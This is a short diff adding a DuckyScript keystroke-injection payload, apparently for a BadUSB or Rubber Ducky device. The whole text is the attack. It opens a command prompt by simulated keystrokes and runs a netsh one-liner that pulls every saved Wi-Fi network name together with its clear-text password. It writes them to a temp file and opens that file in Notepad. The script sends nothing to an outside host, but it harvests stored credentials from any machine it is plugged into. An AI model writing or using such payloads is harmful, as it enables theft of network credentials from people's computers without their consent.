@@ -1,1 +1,9 @@
-
+REM Collects Wi-Fi names and passwords side-by-side and pops open Notepad
+DELAY 400
+GUI r
+DELAY 250
+STRINGLN cmd
+DELAY 500
+STRINGLN (for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "All User Profile"') do @for /f "tokens=*" %b in ("%a") do @set "p=None" & (for /f "tokens=2 delims=:" %c in ('netsh wlan show profile name^="%b" key^=clear ^| findstr "Key Content"') do @for /f "tokens=*" %d in ("%c") do @set "p=%d") & call echo %b : %p%) > "%TEMP%\wifi.txt"
+DELAY 700
+STRINGLN start notepad "%TEMP%\wifi.txt" && exit
